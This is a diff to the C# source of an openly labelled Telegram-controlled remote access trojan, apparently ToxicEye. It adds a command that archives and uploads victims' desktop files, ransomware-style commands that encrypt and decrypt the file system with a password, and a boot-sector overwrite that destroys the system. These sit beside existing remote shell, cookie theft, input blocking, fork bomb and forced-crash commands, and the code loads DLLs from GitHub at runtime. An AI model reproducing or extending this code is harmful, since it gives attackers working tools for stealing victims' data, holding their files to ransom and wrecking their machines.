@@ -84,7 +84,6 @@ namespace TelegramRAT
                             "\n /ProcessList" +
                             "\n /ProcessKill <process>" +
                             "\n /ProcessStart <process>" +
-                            "\n" +
                             "\n /TaskManagerDisable" +
                             "\n /TaskManagerEnable" +
                             "\n" +
@@ -97,6 +96,7 @@ namespace TelegramRAT
                             "\n /GetHistory" +
                             "\n /GetBookmarks" +
                             "\n /GetCookies" +
+                            "\n /GetDesktop" +
                             "\n" +
                             "\n💿 CD-ROM:" +
                             "\n /OpenCD" +
@@ -120,6 +120,7 @@ namespace TelegramRAT
                             "\n /Shell <command>" +
                             "\n /MessageBox <error/info/warn> <text>" +
                             "\n /OpenURL <url>" +
+                            "\n /SetWallpaper <file>" +
                             "\n /SendKeyPress <keys>" +
                             "\n /NetDiscover <to>" +
                             "\n /Uninstall" +
@@ -130,12 +131,14 @@ namespace TelegramRAT
                             "\n /AudioVolumeGet" +
                             "\n" +
                             "\n💣 EVIL:" +
-                            "\n /SetWallpaper <file>" +
                             "\n /BlockInput <seconds>" +
                             "\n /Monitor <on/off/standby>" +
                             "\n /DisplayRotate <0,90,180,270>" +
+                            "\n /EncryptFileSystem <password>" +
+                            "\n /DecryptFileSystem <password>" +
                             "\n /ForkBomb" +
                             "\n /BSoD" +
+                            "\n /OverwriteBootSector" +
                             "\n" +
                             "\n💡 POWER:" +
                             "\n /Shutdown" +
@@ -671,6 +674,13 @@ namespace TelegramRAT
                         telegram.UploadFile(filename, true);
                         break;
                     }
+                // GetDesktop
+                case "GETDESKTOP":
+                    {
+                        telegram.sendText("📦 Archiving desktop files...");
+                        GrabDesktop.get();
+                        break;
+                    }
 
 
 
@@ -1131,6 +1141,12 @@ namespace TelegramRAT
                             telegram.sendText("⛔ Argument <ur> is required for /OpenURL");
                             break;
                         }
+                        // Add http to url
+                        if(!url.StartsWith("http"))
+                        {
+                            url = "http://" + url;
+                        }
+                        // Open
                         try
                         {
                             Process.Start(url);
@@ -1177,7 +1193,7 @@ namespace TelegramRAT
                 // Uninstall
                 case "UNINSTALL":
                     {
-                        telegram.sendText("💉 Uninstalling malware from autorun...");
+                        telegram.sendText("💉 Uninstalling malware from device...");
                         persistence.uninstallSelf();
                         Thread.Sleep(2000);
                         Environment.Exit(0);
@@ -1297,8 +1313,8 @@ namespace TelegramRAT
                             break;
                         }
                         // Load dll'ls
-                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
-                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.CoreAudio.dll");
                         // Set
                         utils.AudioVolumeSet(volume);
                         // Response
@@ -1309,8 +1325,8 @@ namespace TelegramRAT
                 case "AUDIOVOLUMEGET":
                     {
                         // Load dll'ls
-                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
-                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/ToxicEye/master/TelegramRAT/TelegramRAT/core/libs/AudioSwitcher.AudioApi.CoreAudio.dll");
                         // Get
                         double volume = utils.AudioVolumeGet();
                         // Response
@@ -1415,6 +1431,40 @@ namespace TelegramRAT
                         telegram.sendText("📟 Display rotated");
                         break;
                     }
+                // EncryptFileSystem
+                case "ENCRYPTFILESYSTEM":
+                    {
+                        // Check if args exists
+                        string key;
+                        try
+                        {
+                            key = args[1];
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <password> is required for /EncryptFileSystem");
+                            break;
+                        }
+                        utils.EncryptFileSystem(key);
+                        break;
+                    }
+                // DecryptFileSystem
+                case "DECRYPTFILESYSTEM":
+                    {
+                        // Check if args exists
+                        string key;
+                        try
+                        {
+                            key = args[1];
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <password> is required for /DecryptFileSystem");
+                            break;
+                        }
+                        utils.DecryptFileSystem(key);
+                        break;
+                    }
                 // ForkBomb
                 case "FORKBOMB":
                     {
@@ -1452,8 +1502,22 @@ namespace TelegramRAT
                         NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                         break;
                     }
+                // OverwriteBootSector
+                case "OVERWRITEBOOTSECTOR":
+                    {
+                        telegram.sendText("💊 Warning! System will be destroyed! Run command /OverwriteBootSector_CONFIRM to continue.");
+                        break;
+                    }
+                // OverwriteBootSector_CONFIRM
+                case "OVERWRITEBOOTSECTOR_CONFIRM":
+                    {
+                        telegram.sendText("🚨 Trying overwrite boot sector...");
+                        Thread.Sleep(2000);
+                        utils.DestroySystem();
+                        break;
+                    }
 
-                
+
 
 
                 // Unknown command
